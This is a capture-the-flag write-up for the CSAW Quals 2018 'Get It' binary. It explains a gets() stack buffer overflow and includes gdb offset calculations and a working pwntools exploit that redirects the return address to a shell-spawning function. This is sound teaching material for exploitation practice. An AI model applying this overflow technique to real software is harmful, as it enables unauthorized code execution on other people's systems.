# Csaw Quals 2018 Get It

Let's take a look at the binary:

```
$    file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
$    pwn checksec get_it
[*] '/Hackery/pod/modules/bof_callfunction/csaw18_getit/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./get_it
Do you gets it??
15935728
```

So we can see that we are given a `64` bit binary, with a Non-Executable stack (that mitigation will be covered later). When we run it, we see that it prompts us for input. When we take a look at the main function in Ghidra, we see this:

```
undefined8 main(void)

{
  char input [32];
 
  puts("Do you gets it??");
  gets(input);
  return 0;
}
```

So we can see that it makes a call to the `gets` function with the char buffer `input` as an argument. This is a bug. The thing about the `gets` function, is that there is no size restriction on the amount of data it will scan in. It will just scan in data until it gets either a newline character or EOF (or something causes it to crash). Because if this we can write more data to `input` than it can hold (which it can hold `32` bytes worth of data) and we will overflow it. The data that we overflow will start overwriting subsequent things in memory. Looking at this function we don't see any other variables that we can overwrite. However we can definitely overwrite the saved return address.

When a function is called, two values that are saved are the base pointer (points to the base of the stack) and instruction pointer (pointing to the instruction following the call). This way when the function is done executing and returns, code execution can pick up where it left off and the code knows where the stack is. These values make up the saved base pointer and saved return address, and in x64 the saved base pointer is stored at `rbp+0x0` and the saved instruction pointer is stored at `rbp+0x8`.

So when the `ret` instruction, the saved instruction pointer (stored at `rbp+0x8`) is executed. This address is on the stack, and we can reach it with the `gets` function call. So we will just overwrite it with a value we want, and we will decide what code the program executes. The offset between the start of our input and the return address is `40` bytes. The first `32` bytes come from the `input` char buffer we have to fill up. After that we can see there are no variables between `input` and the saved base pointer (if there was a stack canary that would be a different story, but I'll save that for later). After that we have `8` bytes for the saved base pointer, then we reach the saved instruction pointer. We can also see this in memory with gdb:

```
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:    push   rbp
   0x00000000004005c8 <+1>:    mov    rbp,rsp
   0x00000000004005cb <+4>:    sub    rsp,0x30
   0x00000000004005cf <+8>:    mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:    mov    edi,0x40068e
   0x00000000004005db <+20>:    call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:    mov    rdi,rax
   0x00000000004005e7 <+32>:    mov    eax,0x0
   0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:    mov    eax,0x0
   0x00000000004005f6 <+47>:    leave  
   0x00000000004005f7 <+48>:    ret    
End of assembler dump.
gef➤  b *0x4005f1
Breakpoint 1 at 0x4005f1
gef➤  r
Starting program: /Hackery/pod/modules/bof_callfunction/csaw18_getit/get_it
Do you gets it??
15935728
```

We set a breakpoint for right after the `gets` call:

```
Breakpoint 1, 0x00000000004005f1 in main ()
gef➤  i f
Stack level 0, frame at 0x7fffffffdea0:
 rip = 0x4005f1 in main; saved rip = 0x7ffff7a05b97
 Arglist at 0x7fffffffde90, args:
 Locals at 0x7fffffffde90, Previous frame's sp is 0x7fffffffdea0
 Saved registers:
  rbp at 0x7fffffffde90, rip at 0x7fffffffde98
gef➤  x/g $rbp+0x8
0x7fffffffde98:    0x00007ffff7a05b97
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602670 - 0x602678  →   "15935728"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde70 - 0x7fffffffde78  →   "15935728"
```

So we can see that the return address i stored at `0x7fffffffde98`. Our input begins at `0x7fffffffde70`. This gives us a `0x7fffffffde98 - 0x7fffffffde70 = 0x28` byte offset (`0x28 = 40`). So we just have to write `40` bytes worth of input and we can write over the return address. That address will be executed when the `ret` instruction is executed, giving us code execution. The question is now what do we want to execute? Looking through the list of functions in Ghidra, we see that there is a `give_shell` function:

```
void give_shell(void)

{
  system("/bin/bash");
  return;
}
```

This function looks like it just gives us a shell by calling `system("/bin/bash")`. In the assembly viewer we can see that it starts at `0x4005b6`. So we can just call the `give_shell` function by writing over the return address with `0x4005b6` and that should give us a shell. Putting it all together, we get the following exploit:

```
from pwn import *

target = process("./get_it")
#gdb.attach(target, gdbscript = 'b *0x4005f1')

payload = ""
payload += "0"*40 # Padding to the return address
payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use the new shell
target.interactive()
```

When we run it:
```
$    python exploit.py
[+] Starting local process './get_it': pid 2969
[*] running in new terminal: /usr/bin/gdb -q  "./get_it" 2969 -x "/tmp/pwndObRhj.gdb"
[+] Waiting for debugger: Done
[*] Switching to interactive mode
Do you gets it??
$ w
 23:38:26 up 1 min,  1 user,  load average: 1.77, 0.67, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               23:37    1:20   2.71s  0.14s /sbin/upstart --user
$ ls
exploit.py  get_it
```

Just like that we got a shell!
